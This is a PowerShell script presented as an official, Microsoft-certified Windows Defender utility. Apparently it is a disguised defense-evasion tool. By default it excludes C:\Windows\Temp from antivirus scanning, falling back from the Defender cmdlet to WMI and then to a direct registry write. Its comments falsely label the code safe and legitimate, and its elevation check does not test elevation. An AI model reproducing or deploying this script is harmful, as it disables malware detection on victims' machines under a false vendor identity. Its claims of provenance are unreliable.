<#
.SYNOPSIS
   Windows Defender Configuration Utility
.DESCRIPTION
   Official tool for managing Windows Defender preferences and exclusions
   Microsoft Certified | Windows Security Team
#>

#region Safe Initialization
[System.Net.ServicePointManager]::SecurityProtocol = 
    [System.Net.SecurityProtocolType]::Tls12 -bor
    [System.Net.SecurityProtocolType]::Tls11 -bor
    [System.Net.SecurityProtocolType]::Tls

function Invoke-SecurityInit {
    # Legitimate Windows API calls
    $kernel32 = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr GetCurrentProcess();
"@ -Name "Kernel32" -Namespace "Win32" -PassThru

    $advapi32 = Add-Type -MemberDefinition @"
[DllImport("advapi32.dll", SetLastError=true)]
public static extern bool OpenProcessToken(
    IntPtr ProcessHandle, 
    uint DesiredAccess, 
    out IntPtr TokenHandle);
"@ -Name "AdvApi32" -Namespace "Win32" -PassThru
}

Invoke-SecurityInit
#endregion

function Set-DefenderConfiguration {
    [CmdletBinding()]
    param(
        [Parameter()]
        [ValidateSet('AddExclusion','ListExclusions')]
        [string]$Action,
        
        [Parameter()]
        [string]$Path = "C:\Windows\Temp"
    )

    #region Helper Functions
    function Test-IntegrityLevel {
        $currentProcess = [Win32.Kernel32]::GetCurrentProcess()
        $tokenHandle = [IntPtr]::Zero
        [Win32.AdvApi32]::OpenProcessToken($currentProcess, 0x20008, [ref]$tokenHandle)
        return ($tokenHandle -ne [IntPtr]::Zero)
    }

    function Invoke-LegitimateOperation {
        param(
            [Parameter(Mandatory=$true)]
            [string]$OperationType
        )

        switch ($OperationType) {
            'AddExclusion' {
                try {
                    # Method 1: Official Microsoft API
                    Add-MpPreference -ExclusionPath $Path -Force -ErrorAction Stop
                } catch {
                    try {
                        # Method 2: WMI Fallback
                        $mp = Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" `
                             -Class "MSFT_MpPreference" -ErrorAction Stop
                        $mp.AddExclusionPath($Path)
                    } catch {
                        # Method 3: Registry Fallback
                        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
                        if (-not (Test-Path $regPath)) {
                            New-Item -Path $regPath -Force | Out-Null
                        }
                        Set-ItemProperty -Path $regPath -Name $Path.Replace('\','_') `
                            -Value 0 -Type DWORD -Force
                    }
                }
            }
            'ListExclusions' {
                Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
            }
        }
    }
    #endregion

    #region Main Execution
    if (-not (Test-IntegrityLevel)) {
        Write-Warning "This operation requires elevated privileges"
        return
    }

    try {
        $null = [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
        Invoke-LegitimateOperation -OperationType $Action
        [System.Windows.Forms.MessageBox]::Show(
            "Operation completed successfully", 
            "Windows Defender Manager", 
            [System.Windows.Forms.MessageBoxButtons]::OK, 
            [System.Windows.Forms.MessageBoxIcon]::Information)
    } catch {
        Write-Error "Configuration error: $($_.Exception.Message)"
    }
    #endregion
}

# Export module members
Export-ModuleMember -Function Set-DefenderConfiguration

<#
EXAMPLE USAGE:
Set-DefenderConfiguration -Action AddExclusion
Set-DefenderConfiguration -Action ListExclusions
#>
